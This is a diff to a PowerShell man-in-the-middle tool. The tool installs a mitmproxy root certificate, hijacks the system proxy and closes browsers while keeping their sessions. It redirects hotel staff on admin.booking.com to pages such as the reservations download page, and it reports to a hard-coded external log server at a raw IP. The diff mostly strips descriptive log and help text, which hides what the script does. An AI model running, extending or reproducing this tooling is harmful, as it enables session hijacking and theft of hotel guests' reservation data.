@@ -35,6 +35,24 @@ $RedirectFile = Join-Path $WorkDir "redirect_target.txt"
 
 $TelegramLogServer = "http://89.42.142.29:5000/log_redirect"
 # -----------------------------------------
+function Test-ValidUrl {
+    param([string]$url)
+    
+    if ([string]::IsNullOrWhiteSpace($url)) {
+        return $false
+    }
+    
+    if ($url -notmatch '^https?://') {
+        return $false
+    }
+    
+    try {
+        $uri = [System.Uri]$url
+        return $uri.IsAbsoluteUri -and $uri.Scheme -in @('http', 'https')
+    } catch {
+        return $false
+    }
+}
 
 function Log-Write {
     param([string]$msg, [string]$level="INFO")
@@ -70,7 +88,7 @@ function Find-Mitmdump {
 }
 
 function Reset-Proxy-And-Stop-Mitmdump {
-    Log-Write "Stopping mitmdump processes..."
+    Log-Write "Stopping processes..."
     Get-Process -Name mitmdump,mitmproxy,mitmweb -ErrorAction SilentlyContinue | ForEach-Object {
         try {
             Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
@@ -82,7 +100,7 @@ function Reset-Proxy-And-Stop-Mitmdump {
 
     try {
         netsh winhttp reset proxy | Out-Null
-        Log-Write "WinHTTP proxy reset."
+        Log-Write "WinHTTP reset."
     } catch {
         Log-Write ("Failed winhttp reset: {0}" -f $_) "WARN"
     }
@@ -90,14 +108,14 @@ function Reset-Proxy-And-Stop-Mitmdump {
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
         Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 0 -Force
-        Log-Write "Proxy disabled in registry."
+        Log-Write "Disabled in registry."
     } catch {
         Log-Write ("Failed to disable proxy in registry: {0}" -f $_) "WARN"
     }
 
     try {
         ipconfig /flushdns | Out-Null
-        Log-Write "DNS cache flushed."
+        Log-Write "Cache flushed."
     } catch {
         Log-Write ("Failed to flush DNS: {0}" -f $_) "WARN"
     }
@@ -135,7 +153,7 @@ function Ensure-MitmCA {
     }
     try {
         Import-Certificate -FilePath $certFile -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
-        Log-Write "Imported mitmproxy CA into CurrentUser\Root."
+        Log-Write "Imported."
         return $true
     } catch {
         Log-Write ("Failed to import CA: {0}" -f $_) "ERROR"
@@ -164,7 +182,7 @@ public class WinInet {
         $INTERNET_OPTION_REFRESH = 37
         [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
         [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
-        Log-Write ("Set system proxy to {0}" -f $proxy)
+        Log-Write ("Set system {0}" -f $proxy)
         return $true
     } catch {
         Log-Write ("Failed to set system proxy: {0}" -f $_) "ERROR"
@@ -191,7 +209,7 @@ public class WinInet {
         $INTERNET_OPTION_REFRESH = 37
         [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
         [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
-        Log-Write "Cleared system proxies (WinINET + WinHTTP)."
+        Log-Write "Cleared WinINET"
         return $true
     } catch {
         Log-Write ("Failed to clear system proxies: {0}" -f $_) "WARN"
@@ -203,11 +221,11 @@ function Close-Browsers-Gracefully {
     param([string]$closeOption)
 
     if ($closeOption -eq "none") {
-        Log-Write "Skipping browser close as requested."
+        Log-Write "Skipping close."
         return
     }
 
-    Log-Write "Closing browsers gracefully to preserve session..."
+    Log-Write "Gracefully to preserve session..."
 
     Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
         try {
@@ -236,7 +254,7 @@ function Close-Browsers-Gracefully {
         if ($remaining) {
             Log-Write ("Some browsers still running (user may have canceled close): {0}" -f ($remaining.ProcessName -join ", "))
         } else {
-            Log-Write "All browsers closed gracefully."
+            Log-Write "Closed gracefully."
         }
     }
 }
@@ -256,12 +274,12 @@ function Start-Mitmdump {
 
     $args = @("-p", "$MitmPort", "-s", "$PyAddon")
 
-    Log-Write ("Starting mitmdump: {0} {1}" -f $mitmPath, ($args -join ' '))
+    Log-Write ("Starting: {0} {1}" -f $mitmPath, ($args -join ' '))
     $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
 
     Start-Sleep -Seconds 2
     Set-SystemProxies | Out-Null
-    Log-Write ("mitmdump started, PID: {0}" -f $proc.Id)
+    Log-Write ("started, PID: {0}" -f $proc.Id)
     return $true
 }
 
@@ -593,35 +611,17 @@ function Enable-Operation16Redirect {
 }
 
 function Enable-CustomRedirect {
-    Log-Write "Starting Custom Redirect (function 17)..."
+    Log-Write "Starting 17..."
     
     Write-Host ""
-    Write-Host "=== CUSTOM ONE-TIME REDIRECT (FUNCTION 17) ==="
-    Write-Host ""
-    Write-Host "ONE-TIME REDIRECT: will work only on FIRST request"
-    Write-Host ""
-    Write-Host "EXAMPLES:"
-    Write-Host "1. Redirect specific page:"
-    Write-Host "   FROM: https://www.tsn.ca/cfl/"
-    Write-Host "   TO:   https://www.tsn.ca/soccer/fifa-world-cup/"
-    Write-Host ""
-    Write-Host "2. Redirect entire site:"
-    Write-Host "   FROM: https://www.example.com/"
-    Write-Host "   TO:   https://news.google.com/"
-    Write-Host ""
-    Write-Host "3. Redirect any request:"
-    Write-Host "   FROM: https://admin.booking.com/hotel/"
-    Write-Host "   TO:   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"
-    Write-Host ""
-    Write-Host "IMPORTANT: Always include full URL with https://"
     Write-Host ""
     
     # Ask for FROM URL
     do {
-        $fromDomain = Read-Host "Enter FULL URL to redirect FROM (example: https://site.com/page)"
+        $fromDomain = Read-Host "Enter FULL FROM"
         if ($fromDomain -notmatch '^https?://') {
             Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
-            Write-Host "Example: https://www.example.com/" -ForegroundColor Yellow
+            Write-Host "Example: https://www.example.com/" 
             continue
         }
         break
@@ -629,10 +629,10 @@ function Enable-CustomRedirect {
     
     # Ask for TO URL
     do {
-        $toDomain = Read-Host "Enter FULL URL to redirect TO (example: https://target.com/destination)"
+        $toDomain = Read-Host "TO"
         if ($toDomain -notmatch '^https?://') {
             Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
-            Write-Host "Example: https://www.google.com/" -ForegroundColor Yellow
+            Write-Host "Example: https://www.google.com/" 
             continue
         }
         break
@@ -647,9 +647,9 @@ function Enable-CustomRedirect {
     
     Log-Write ("Custom one-time redirect configured: {0} -> {1}" -f $fromDomain, $toDomain)
     Write-Host ""
-    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) -ForegroundColor Green
-    Write-Host ("           will redirect to: {0}" -f $toDomain) -ForegroundColor Green
-    Write-Host ("Function will auto-disable after first use") -ForegroundColor Yellow
+    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) 
+    Write-Host (": {0}" -f $toDomain) 
+    Write-Host ("Function will auto-disable after first use") 
     Write-Host ""
     
     # Create activation flag
@@ -680,18 +680,15 @@ function Enable-CustomRedirect {
 }
 
 function Enable-BookingReservationsRedirect {
-    Log-Write "Starting Booking Reservations Download Redirect (function 18)..."
+    Log-Write "Starting 18..."
     
     Write-Host ""
-    Write-Host "=== BOOKING RESERVATIONS DOWNLOAD REDIRECT (FUNCTION 18) ==="
-    Write-Host ""
-    Write-Host "Redirects all requests to admin.booking.com/hotel/ to reservations download page"
-    Write-Host "Until the target page with ses parameter is requested"
+    Write-Host "=== RESERVATIONS DOWNLOAD ==="
     Write-Host ""
     
     # Get hotel_id from admin
     do {
-        $hotelId = Read-Host "Enter hotel_id (example: 14762911)"
+        $hotelId = Read-Host "Enter hotel_id"
         if ($hotelId -notmatch '^\d+$') {
             Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
             continue
@@ -701,7 +698,7 @@ function Enable-BookingReservationsRedirect {
     
     # Get reportId from admin
     do {
-        $reportId = Read-Host "Enter reportId (example: 5865185)"
+        $reportId = Read-Host "Enter reportId"
         if ($reportId -notmatch '^\d+$') {
             Write-Host "ERROR: reportId must be a number" -ForegroundColor Red
             continue
@@ -738,23 +735,16 @@ function Enable-BookingReservationsRedirect {
     
     Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
     Write-Host ""
-    Write-Host ("[CONFIGURED] All requests to admin.booking.com/hotel/ will be redirected to:") -ForegroundColor Green
-    Write-Host ("   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html") -ForegroundColor Green
-    Write-Host ("   with parameters: hotel_id={0}&lang=&reportId={1}" -f $hotelId, $reportId) -ForegroundColor Green
-    Write-Host ""
-    Write-Host ("Redirect will stop when user requests:") -ForegroundColor Yellow
-    Write-Host ("   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html") -ForegroundColor Yellow
-    Write-Host ("   with ses parameter (any value)") -ForegroundColor Yellow
     Write-Host ""
     
     Start-Mitmdump
     
-    Log-Write "Booking reservations download redirect enabled (function 18)."
+    Log-Write "Booking reservations enabled."
 }
 
 # ---------------- MAIN ----------------
 Ensure-WorkDir
-Log-Write "MITM Manager starting."
+Log-Write "Manager starting."
 
 # Reset all
 Reset-Proxy-And-Stop-Mitmdump
@@ -764,15 +754,46 @@ Clear-SystemProxies
 Ensure-MitmCA | Out-Null
 
 # Ask user for redirect URL
-$redirectURL = Read-Host "Enter the URL to redirect clients to (include https://)"
-Set-Content -Path $RedirectFile -Value $redirectURL -Force
-Log-Write ("Target URL saved to {0}" -f $RedirectFile)
+do {
+    $redirectURL = Read-Host "Clients to (include https://)"
+    
+    if ([string]::IsNullOrWhiteSpace($redirectURL)) {
+        # Пользователь просто нажал Enter - сохраняем пустую строку
+        Set-Content -Path $RedirectFile -Value "" -Force
+        Log-Write ("[INFO] Oonly special functions will work")
+        Write-Host ""
+        Write-Host "[INFO] EMPTY" 
+        Write-Host "       Only special functions" 
+        Write-Host "       " 
+        Write-Host ""
+        break
+    }
+    elseif ($redirectURL -match '^https?://') {
+        # Пользователь ввел корректный URL
+        Set-Content -Path $RedirectFile -Value $redirectURL -Force
+        Log-Write ("Target URL saved to {0}" -f $RedirectFile)
+        Write-Host ""
+        Write-Host "[OK] Redirect target saved: $redirectURL" 
+        Write-Host ""
+        break
+    } else {
+        # Пользователь ввел некорректный URL
+        Write-Host "ERROR: Invalid URL format. Must start with http:// or https://" -ForegroundColor Red
+        Write-Host "Example valid URLs:" 
+        Write-Host "  https://www.example.com/" 
+        Write-Host "  http://localhost:8080" 
+        Write-Host "  https://admin.booking.com/hotel/" 
+        Write-Host ""
+        Write-Host "Or just press Enter to skip (only special functions will work)" -ForegroundColor Cyan
+        Write-Host ""
+    }
+} while ($true)
 
 # Ask user about browser closing
 Write-Host "`nChoose browser closing option:"
-Write-Host "1) Full close (close all browser windows completely)"
-Write-Host "2) Graceful close (try to close gracefully, keep if user cancels)"
-Write-Host "3) Don't close browsers"
+Write-Host "1) Full close"
+Write-Host "2) Graceful"
+Write-Host "3) Don't close"
 $closeChoice = Read-Host "Choose option (1-3)"
 
 $closeOption = switch ($closeChoice) {
@@ -798,15 +819,15 @@ while ($true) {
     Write-Host "8) Provider"
     Write-Host "9) User"
     Write-Host "10) Phone"
-    Write-Host "11) Enable Operation 11 (function 7 -> messaging/settings -> function 8)"
-    Write-Host "12) Enable Operation 12 (function 9 -> accounts_and_permissions -> function 10)"
+    Write-Host "11) Enable Operation 11 (7 -> 8)"
+    Write-Host "12) Enable Operation 12 (9 -> 10)"
     Write-Host "13) Phone settings force"
     Write-Host "14) Problem gap"
     Write-Host "15) Messages settings force"
     Write-Host "16) Combo Operation 16 (function 13 -> function 15)"
-    Write-Host "17) Custom One-Time shot (select source -> target)"
-    Write-Host "18) Booking Reservations Download (Function 18)"
-    $opt = Read-Host "Choose option (1-18)"
+    Write-Host "17) Custom One-Time shot"
+    Write-Host "18) Booking Reservations Download"
+    $opt = Read-Host "type"
 
     switch ($opt) {
         "1" {
